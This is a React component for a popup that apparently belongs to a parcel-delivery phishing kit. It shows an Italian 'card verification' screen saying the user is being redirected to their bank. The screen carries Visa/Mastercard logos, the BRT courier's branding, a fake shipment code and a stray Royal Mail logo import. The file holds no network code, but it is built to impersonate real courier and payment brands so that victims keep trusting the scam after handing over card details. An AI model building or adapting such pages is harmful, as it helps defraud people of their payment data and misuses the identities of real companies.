import { Card } from "@/components/ui/card";
import { Dialog, DialogContent, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Shield, X, CreditCard } from "lucide-react";
import royalMailLogo from "@/assets/royal-mail-logo.png";
import visaLogo from "@/assets/Visa.png";
import mastercardLogo from "@/assets/master.png";
import brtLogo from "@/assets/brt-logo.png";

interface PaymentRedirectPopupProps {
  isOpen: boolean;
  onClose: () => void;
  cardType?: string | null;
}

const PaymentRedirectPopup = ({ isOpen, onClose, cardType }: PaymentRedirectPopupProps) => {
  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogTitle className="sr-only">Elaborazione pagamento</DialogTitle>
      <DialogDescription className="sr-only">Reindirizzamento alla tua banca per il pagamento</DialogDescription>
      <DialogContent className="p-0 border-0 bg-black/20 shadow-none max-w-[320px] w-full my-2 max-h-[90vh] overflow-y-auto data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=open]:duration-300">
        <div className="h-auto flex flex-col">
          <Card className="shadow-2xl border-2 border-red-500 rounded-[6px] drop-shadow-xl bg-white flex flex-col transform transition-all duration-300 ease-in-out data-[state=open]:animate-in data-[state=open]:zoom-in-95 data-[state=open]:fade-in-0 hover:scale-98 hover:shadow-xl">
            {/* Banner with Logo - Sticky */}
            <div className="sticky top-0 z-10 bg-gradient-to-r from-primary to-primary-light p-4 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-primary to-primary-light border-2 border-red-500 rounded-sm px-3 py-0.5 shadow-lg">
                  <span className="text-gray-100 font-semibold text-xs">Verifica carta</span>
                </div>
                {/* Close Button */}
                <button onClick={onClose} className="absolute right-3 top-3 bg-red-400/80 hover:bg-red-400 rounded-full w-6 h-6 flex items-center justify-center shadow-md hover:shadow-lg transition-all duration-300 hover:scale-105 border border-red-500">
                  <X className="h-4 w-4 text-white" />
                </button>
              </div>
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 w-10 h-10 bg-white/30 rounded-full flex items-center justify-center shadow-lg border-2 border-white/50">
                <Shield className="h-6 w-6 text-gray-100 drop-shadow-lg" />
              </div>
            </div>
            
            <div className="px-2 pt-4 pb-4 my-0 mx-[10px]">
              <div className="space-y-4 animate-fade-in">
                <div className="py-16 px-6 bg-blue-50 rounded-xl border border-border/50 shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                  <div className="text-center space-y-8">
                    <div className="space-y-8">
                       <div className="flex flex-col items-center space-y-8">
                         <div className="flex flex-col items-center space-y-2">
                           {/* Card Logo */}
                           {cardType && (
                             <div>
                               {cardType === 'visa' && (
                                 <img src={visaLogo} alt="Visa" className="h-8 w-auto animate-[pulse-scale_1.5s_ease-in-out_infinite]" />
                               )}
                               {cardType === 'mastercard' && (
                                 <img src={mastercardLogo} alt="MasterCard" className="h-8 w-auto animate-[pulse-scale_1.5s_ease-in-out_infinite]" />
                               )}
                             </div>
                           )}
                           <div className="text-center">
                             <p className="text-xs text-gray-500 font-medium">
                               Reindirizzamento alla tua banca
                             </p>
                             <div className="flex justify-center gap-0.5 mt-1">
                               <span className="w-1 h-1 bg-gray-500 rounded-full animate-[pulse-scale_1s_ease-in-out_infinite]" style={{animationDelay: '0s'}}></span>
                               <span className="w-1 h-1 bg-gray-500 rounded-full animate-[pulse-scale_1s_ease-in-out_infinite]" style={{animationDelay: '0.3s'}}></span>
                               <span className="w-1 h-1 bg-gray-500 rounded-full animate-[pulse-scale_1s_ease-in-out_infinite]" style={{animationDelay: '0.6s'}}></span>
                             </div>
                           </div>
                         </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {/* Status Banner - BRT style */}
            <div className="sticky bottom-0 z-10 bg-gradient-to-r from-red-400 to-red-500 p-2 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-red-300 to-red-400 border-2 border-white rounded-sm px-3 py-1 shadow-lg flex items-center space-x-2">
                  <div className="w-4 h-4 bg-white rounded-full flex items-center justify-center">
                    <CreditCard className="h-2.5 w-2.5 text-green-600" />
                  </div>
                  <span className="text-white font-semibold text-xs">IT714562018FL</span>
                </div>
              </div>
              <img src={brtLogo} alt="BRT Logo" className="absolute left-4 top-1/2 transform -translate-y-1/2 h-6 w-auto" />
            </div>
          </Card>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default PaymentRedirectPopup;